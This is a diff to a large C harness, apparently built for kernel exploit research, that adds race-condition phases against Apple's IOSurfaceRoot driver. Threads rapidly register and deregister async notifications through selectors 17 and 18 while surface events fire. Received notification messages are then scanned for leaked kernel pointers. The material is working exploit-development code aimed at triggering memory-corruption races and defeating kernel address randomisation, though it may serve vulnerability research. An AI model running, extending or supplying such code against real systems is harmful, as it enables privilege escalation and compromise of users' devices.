@@ -17113,10 +17113,24 @@ new_modes:
             /* Phase 7: Multi-connection race (separate IOKit connections) */
             rlog("\n--- Phase 7: Multi-connection register/deregister race ---\n");
 
+            /* Look up IOSurfaceRoot again (original service was released) */
+            io_service_t service2 = IOServiceGetMatchingService(
+                kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot"));
+            rlog("  Service2: 0x%x\n", service2);
+
             /* Open a SECOND connection to IOSurfaceRoot */
             io_connect_t conn2 = IO_OBJECT_NULL;
-            kr = IOServiceOpen(service, mach_task_self(), 0, &conn2);
-            rlog("  Second connection: 0x%08x (conn2=0x%x)\n", kr, conn2);
+            kern_return_t kr2_open = 0;
+            if (service2) {
+                /* Try type 0 first, then type 1 */
+                kr2_open = IOServiceOpen(service2, mach_task_self(), 0, &conn2);
+                rlog("  conn2 type=0: 0x%08x (conn2=0x%x)\n", kr2_open, conn2);
+                if (conn2 == IO_OBJECT_NULL) {
+                    kr2_open = IOServiceOpen(service2, mach_task_self(), 1, &conn2);
+                    rlog("  conn2 type=1: 0x%08x (conn2=0x%x)\n", kr2_open, conn2);
+                }
+                IOObjectRelease(service2);
+            }
 
             if (conn2 != IO_OBJECT_NULL) {
                 /* Create a second wake port for conn2 */
@@ -17426,6 +17440,138 @@ new_modes:
                     mach_port_deallocate(mach_task_self(), wake2);
                 IOServiceClose(conn2);
             }
+
+            /* Phase 8: Surface-event-triggered race (single connection) */
+            rlog("\n--- Phase 8: Surface event + deregister race ---\n");
+
+            /* The notification fires when a surface event occurs.
+               Race: trigger surface event (notification dispatch walks registry)
+               vs deregister (removes from registry). Both access the same list. */
+
+            typedef struct {
+                _Atomic int go;
+                _Atomic int stop;
+                _Atomic int events_fired;
+                _Atomic int dereg_ok;
+                _Atomic int dereg_bad;
+                _Atomic int reg_ok;
+                _Atomic int stale_notify;
+                IOSurfaceRef surf;
+                uint32_t sid;
+                io_connect_t conn;
+                mach_port_t wp;
+            } evt_race_t;
+
+            __block evt_race_t er = {0};
+            er.conn = conn;
+            er.wp = wake_port;
+
+            /* Create a surface to use */
+            int ew = 16, eh = 16, ebpe = 4, epf = 0x42475241;
+            CFNumberRef en[4];
+            en[0] = CFNumberCreate(NULL, kCFNumberIntType, &ew);
+            en[1] = CFNumberCreate(NULL, kCFNumberIntType, &eh);
+            en[2] = CFNumberCreate(NULL, kCFNumberIntType, &ebpe);
+            en[3] = CFNumberCreate(NULL, kCFNumberIntType, &epf);
+            CFStringRef ek[] = {
+                CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")
+            };
+            CFDictionaryRef ep = CFDictionaryCreate(NULL,
+                (const void **)ek, (const void **)en, 4,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            er.surf = IOSurfaceCreate(ep);
+            er.sid = er.surf ? IOSurfaceGetID(er.surf) : 0;
+            rlog("  Event-race surface ID: %u\n", er.sid);
+
+            if (er.surf && er.sid) {
+                dispatch_queue_t q_evt = dispatch_queue_create("evt", NULL);
+                dispatch_queue_t q_reg = dispatch_queue_create("reg8", NULL);
+
+                /* Thread A: rapidly register, modify surface, deregister */
+                dispatch_async(q_reg, ^{
+                    while (!er.go) usleep(1);
+                    uint8_t inp[24]; memset(inp, 0, 24);
+                    memcpy(inp, &er.sid, 4);
+
+                    for (int i = 0; i < 2000 && !er.stop; i++) {
+                        uint64_t ref[1] = {0xF0F00000 + i};
+                        kern_return_t rr = IOConnectCallAsyncStructMethod(er.conn, 17,
+                            er.wp, ref, 1, inp, 24, NULL, NULL);
+                        if (rr == 0) er.reg_ok++;
+
+                        /* Immediately deregister */
+                        kern_return_t dr = IOConnectCallStructMethod(er.conn, 18,
+                            inp, 24, NULL, NULL);
+                        if (dr == 0) er.dereg_ok++;
+                        else er.dereg_bad++;
+                    }
+                });
+
+                /* Thread B: rapidly modify the surface (triggers notifications) */
+                dispatch_async(q_evt, ^{
+                    while (!er.go) usleep(1);
+                    for (int i = 0; i < 5000 && !er.stop; i++) {
+                        /* Set/remove values to trigger surface events */
+                        CFStringRef key = CFStringCreateWithFormat(NULL, NULL,
+                            CFSTR("test_%d"), i);
+                        CFNumberRef val = CFNumberCreate(NULL, kCFNumberIntType, &i);
+                        IOSurfaceSetValue(er.surf, key, val);
+                        IOSurfaceRemoveValue(er.surf, key);
+                        CFRelease(key);
+                        CFRelease(val);
+                        er.events_fired++;
+
+                        /* Also lock/unlock (another type of event) */
+                        IOSurfaceLock(er.surf, 0, NULL);
+                        IOSurfaceUnlock(er.surf, 0, NULL);
+                    }
+                    er.stop = 1;
+                });
+
+                er.go = 1;
+                dispatch_sync(q_evt, ^{});
+                dispatch_sync(q_reg, ^{});
+
+                /* Check for notifications that arrived */
+                int notify_count = 0;
+                for (int mi = 0; mi < 200; mi++) {
+                    struct {
+                        mach_msg_header_t hdr;
+                        uint8_t body[512];
+                    } msg;
+                    memset(&msg, 0, sizeof(msg));
+                    msg.hdr.msgh_size = sizeof(msg);
+                    msg.hdr.msgh_local_port = wake_port;
+
+                    kern_return_t mk = mach_msg(&msg.hdr,
+                        MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                        0, sizeof(msg), wake_port, 10, MACH_PORT_NULL);
+                    if (mk != KERN_SUCCESS) break;
+                    notify_count++;
+
+                    int bsz = msg.hdr.msgh_size > sizeof(mach_msg_header_t) ?
+                        msg.hdr.msgh_size - sizeof(mach_msg_header_t) : 0;
+                    if (notify_count <= 5) {
+                        rlog("  notify[%d]: sz=%u id=%d bsz=%d",
+                             notify_count, msg.hdr.msgh_size, msg.hdr.msgh_id, bsz);
+                        if (bsz > 0 && bsz <= 32) {
+                            rlog(" data:");
+                            for (int bi = 0; bi < bsz; bi++)
+                                rlog("%02x", msg.body[bi]);
+                        }
+                        rlog("\n");
+                    }
+                    SEL17_SCAN_KPTRS(msg.body, bsz, "evt_notify");
+                }
+
+                rlog("  reg_ok=%d dereg_ok=%d dereg_bad=%d events=%d notifications=%d\n",
+                     er.reg_ok, er.dereg_ok, er.dereg_bad, er.events_fired, notify_count);
+
+                CFRelease(er.surf);
+            }
+            CFRelease(ep);
+            for (int ni = 0; ni < 4; ni++) CFRelease(en[ni]);
 
             mach_port_deallocate(mach_task_self(), wake_port);
         }
